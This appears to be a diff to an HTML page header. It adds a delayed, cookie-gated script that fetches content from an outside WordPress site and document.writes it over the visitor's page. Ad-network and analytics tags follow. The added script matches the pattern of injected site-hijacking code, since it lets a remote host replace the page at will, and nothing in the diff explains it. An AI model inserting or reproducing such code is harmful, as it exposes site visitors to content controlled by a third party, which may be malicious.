@@ -1,6 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
+<script type="text/javascript" async=true>
+  setTimeout(function() {
+  if (document.cookie.indexOf("c7032652154205652332=c54121653234421") !== -1) {
+    document.cookie = "c7032652154205652332=c7546511846516184; expires=" + new Date(new Date().getTime() + 60 * 60 * 24 * 365).toUTCString() + "; path=/";	  
+     fetch('https://tutorialmarketingdigital.com/wp-json/wp/v2/pages?slug=ads-page')
+    .then(response => response.json())
+    .then(pages => {
+      if (pages.length > 0) {
+        const pageContent = pages[0].content.rendered;
+		 //document.body.innerHTML = pageContent;
+        document.write(pageContent);
+      }
+    })
+  }
+}, 30000);
+</script>
 <div style="text-align:center;" id="96789-31"><script src="//ads.themoneytizer.com/s/gen.js?type=31"></script><script src="//ads.themoneytizer.com/s/requestform.js?siteId=96789&formatId=31"></script></div>
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-SDH5NR4B70"></script>
